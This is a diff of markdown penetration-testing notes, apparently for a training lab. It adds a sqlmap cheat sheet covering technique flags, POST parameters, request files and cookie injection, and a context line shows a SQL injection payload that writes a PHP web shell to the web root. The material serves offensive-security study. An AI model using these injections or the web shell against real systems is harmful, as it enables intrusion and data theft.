@@ -199,6 +199,49 @@ Write PHP Shell to file
 cn' union select 1,'<?=`$_GET[0]`?>',3,4 into outfile '/var/www/html/test.php'-- -
 ```
 
+### SQL Map
+Basic Command
+```bash
+python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
+```
+`--technique=<TECH>`:
+- B: Boolean-based blind
+- E: Error-based
+- U: Union query-based
+- S: Stacked queries
+- T: Time-based blind
+- Q: Inline queries
+
+Top Tip:
+1. In the browser Copy request as cURL
+2. Past into bash
+3. Replace curl command with sqlmap, and keep request
+
+POST Requests
+```bash
+# Defaults to test all params
+sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
+
+# Use * to denote specific param (uid in this case)
+sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
+
+```
+Raw Request File:
+```bash
+sqlmap -r req.txt
+```
+
+Specify Cookie:
+```bash
+# Same can be done for other headers: --host, --referer, and -A/--user-agent
+sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+
+# Or parse as header
+sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
+
+```
+
+
 ## 5) XML External Entity (XXE) Injeciton
 ### Basic Explanation:
 Imagine a web app accepts xml user input and reflects the user's email to the page as such
